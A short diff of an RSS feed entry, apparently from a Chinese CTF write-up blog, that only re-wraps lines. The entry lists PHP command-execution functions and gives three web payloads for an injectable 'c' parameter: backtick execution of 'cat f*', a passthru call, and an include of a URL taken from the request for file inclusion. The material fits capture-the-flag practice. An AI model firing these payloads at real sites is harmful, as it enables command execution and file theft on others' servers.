@@ -22,7 +22,10 @@ popen()
 proc_open()
 pcntl_exec()
 反引号
-只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过 payload1:c=echo `cat f*`; payload2:?c=passthru(&amp;quot;cat f*&amp;quot;); 还可以采用文件包含： payload3:?c=echo &amp;quot;lhy &amp;quot;; include($_GET[&#39;url&#39;]); ?</description>
+只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过 payload1:c=echo `cat f*`;
+payload2:?c=passthru(&amp;quot;cat f*&amp;quot;);
+还可以采用文件包含：
+payload3:?c=echo &amp;quot;lhy &amp;quot;; include($_GET[&#39;url&#39;]); ?</description>
     </item>
     
   </channel>
